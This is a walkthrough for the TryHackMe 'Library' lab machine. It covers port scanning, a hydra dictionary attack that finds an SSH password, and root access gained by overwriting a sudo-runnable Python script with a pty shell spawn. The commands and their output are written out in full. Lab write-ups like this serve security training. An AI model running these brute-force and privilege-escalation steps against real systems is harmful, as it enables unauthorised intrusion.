# Library - Walkthrough
**Difficulty:** Easy  
**OS:** Linux

## Introduction

This walkthrough details the steps taken to compromise the "Library" machine on TryHackMe. The process involves initial reconnaissance, identifying valid credentials via dictionary attacks, gaining initial access via SSH, and escalating privileges to root by exploiting a misconfigured Python script allowed to run as root.

---

## 1. Reconnaissance

### Port Scanning
We start by scanning the target machine for open ports and running services using `nmap`.

```bash
nmap -p- -sC -sV -T4 --min-rate=1000 <IP_ADDRESS>
```

**Results:**
```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to  Blog - Library Machine
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We discovered two open ports:
- **22 (SSH):** Running OpenSSH 7.2p2.
- **80 (HTTP):** Running Apache httpd 2.4.18.

### Web Enumeration
Visiting the website on port 80 reveals a blog.
- **Username Discovery:** Reading through the blog posts, we identify a potential username: `meliodas`.
- **Robots.txt:** Checking `/robots.txt` (as noted in the nmap output) reveals a hint pointing towards `rockyou`, likely referring to the `rockyou.txt` wordlist.

---

## 2. Initial Access

With a valid username (`meliodas`) and a hint about the password list (`rockyou`), we can attempt a brute-force attack on the SSH service.

### SSH Brute Force
Using `hydra`, we target the SSH service:

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt <IP_ADDRESS> ssh
```

**Outcome:**
Hydra successfully finds the password for the user `meliodas`.

### Logging In
We log in via SSH using the discovered credentials:

```bash
ssh meliodas@<IP_ADDRESS>
```

After logging in, we find the user flag (`user.txt`) in the home directory.

---

## 3. Privilege Escalation

Now inside the machine, we look for ways to escalate privileges to root.

### sudo Capabilities
We check the user's sudo permissions:

```bash
sudo -l
```

**Output (Example):**
```text
Matching Defaults entries for meliodas on library:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User meliodas may run the following commands on library:
    (ALL) /usr/bin/python /home/meliodas/bak.py
```

This reveals that `meliodas` can run a specific Python script, `/home/meliodas/bak.py`, as root using `sudo`.

### Analyzing the Vector
We examine the `bak.py` file. Since it is located in our home directory and owned by us (or writeable by us), we can modify it. If we replace the contents of this script with code that spawns a shell, running it with `sudo` will execute that shell as root.

### Exploitation
1.  **Delete (or backup) the original script:**
    ```bash
    rm /home/meliodas/bak.py
    ```

2.  **Create a malicious script:**
    We create a new `bak.py` that spawns a bash shell using the `pty` module.
    ```bash
    echo 'import pty; pty.spawn("/bin/bash")' > /home/meliodas/bak.py
    ```

3.  **Execute with sudo:**
    ```bash
    sudo /usr/bin/python /home/meliodas/bak.py
    ```

**Result:**
The command spawns a root shell. We verify our identity:
```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

We can now navigate to `/root` and retrieve the `root.txt` flag.

---

## Conclusion
This machine highlighted the importance of enumeration (finding usernames in content) and checking `robots.txt`. It also demonstrated a classic privilege escalation vector where a user has sudo rights to execute a writeable script, allowing for arbitrary code execution as root.